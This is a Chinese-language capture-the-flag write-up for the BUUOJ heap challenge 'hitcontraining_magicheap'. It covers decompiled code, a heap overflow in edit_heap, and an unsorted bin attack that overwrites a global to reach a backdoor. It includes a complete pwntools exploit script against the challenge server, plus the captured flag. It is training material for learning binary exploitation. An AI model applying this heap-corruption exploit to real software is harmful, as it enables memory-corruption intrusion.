# hitcontraining_magicheap

[题目地址](https://buuoj.cn/challenges#hitcontraining_magicheap)

什么时候才能过去堆的门槛啊？

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

看题目名已经能猜到是堆了，不过pie没看还是有很大帮助的。

```c
void main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_18 [8];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  do {
    while( true ) {
      while( true ) {
        menu();
        read(0,local_18,8);
        iVar1 = atoi(local_18);
        if (iVar1 != 3) break;
        delete_heap();
      }
      if (3 < iVar1) break;
      if (iVar1 == 1) {
        create_heap();
      }
      else if (iVar1 == 2) {
        edit_heap();
      }
      else {
LAB_00400d69:
        puts("Invalid Choice");
      }
    }
    if (iVar1 == 4) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (iVar1 != 4869) goto LAB_00400d69;
    if (magic < 0x1306) {
      puts("So sad !");
    }
    else {
      puts("Congrt !");
      l33t();
    }
  } while( true );
}
```

直接放漏洞点，这题漏洞点太明显了，都不用分析。

```c
void create_heap(void)

{
  int iVar1;
  void *pvVar2;
  long in_FS_OFFSET;
  int local_24;
  char local_18 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_24 = 0;
  do {
    if (9 < local_24) {
code_r0x00400a59:
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    if (*(long *)(heaparray + (long)local_24 * 8) == 0) {
      printf("Size of Heap : ");
      read(0,local_18,8);
      iVar1 = atoi(local_18);
      pvVar2 = malloc((long)iVar1);
      *(void **)(heaparray + (long)local_24 * 8) = pvVar2;
      if (*(long *)(heaparray + (long)local_24 * 8) == 0) {
        puts("Allocate Error");
                    /* WARNING: Subroutine does not return */
        exit(2);
      }
      printf("Content of heap:");
      read_input(*(undefined8 *)(heaparray + (long)local_24 * 8),(long)iVar1);
      puts("SuccessFul");
      goto code_r0x00400a59;
    }
    local_24 = local_24 + 1;
  } while( true );
}
```

创建一个堆块。别看代码十几行，关键点在于：此处询问了要创建堆块的大小并根据提供的大小malloc堆块。

```c
void edit_heap(void)

{
  int iVar1;
  int iVar2;
  char local_14 [4];
  long local_10;
  
  printf("Index :");
  read(0,local_14,4);
  iVar1 = atoi(local_14);
  if ((-1 < iVar1) && (iVar1 < 10)) {
    if (*(long *)(heaparray + (long)iVar1 * 8) == 0) {
      puts("No such heap !");
    }
    else {
      printf("Size of Heap : ");
      read(0,local_14,8);
      iVar2 = atoi(local_14);
      local_10 = (long)iVar2;
      printf("Content of heap : ");
      read_input(*(undefined8 *)(heaparray + (long)iVar1 * 8),local_10);
      puts("Done !");
    }
    return;
  }
  puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
  _exit(0);
}
```

然而edit时又问了一次输入的大小，太经典的堆溢出了。现在要干的只有决定该如何攻击。好消息是main函数中已经提供了后门函数l33t()的调用，只需要我们选项输入4869并且magic的值大于0x1306就行了。`xxx值大于xxx`是[unsorted bin attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/)的标志。先看大佬的[exp](https://blog.csdn.net/mcmuyanga/article/details/112302849)。

```python
from pwn import *

p=remote('node4.buuoj.cn',27579)

def CreateHeap(size,content):
	p.recvuntil(':')
	p.sendline('1')
	p.recvuntil(':')
	p.sendline(str(size))
	p.recvuntil(':')
	p.sendline(content)
 
def EditHeap(idx,size,content):
	p.recvuntil(':')
	p.sendline('2')
	p.recvuntil(':')
	p.sendline(str(idx))
	p.recvuntil(':')
	p.sendline(str(size))
	p.recvuntil(':')
	p.sendline(content)
 
def DeleteHeap(idx):
	p.recvuntil(':')
	p.sendline('3')
	p.recvuntil(':')
	p.sendline(str(idx))

CreateHeap(0x30,'a') #0创建一个0号堆块，什么大小都行，不过要配合下面EditHeap填充的值。这个堆块是为了覆盖下一个堆块的。
CreateHeap(0x80,'b') #被覆盖修改bk指针的1号堆块
CreateHeap(0x20,'c') #2号占位堆块，防止后面free 1号堆块时时，1号堆块与topchunk合并
DeleteHeap(1) #把1号堆块放入unsorted bin
magic=0x006020a0
EditHeap(0,0x50,0x30*b'a'+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)) #编辑0号堆块，0x30个a覆盖0号堆块的空间。接下来伪造一个chunk，p64(0)为prev_size，p64(0x91)为size，p64(0)为fd，p64(magic-0x10)为bk。
#magic是我们要更改地址的地方，也就是target_addr。根据unsorted bin attack，伪造chunk的bk要设置为target_addr-16
CreateHeap(0x80,'d') #之前free的chunk脱链，执行unsorted bin attack
p.sendlineafter(":",'4869')
p.interactive()
```

## Flag
> flag{d3e9df21-6f7e-4f4d-894d-4b33a0b0c8f2}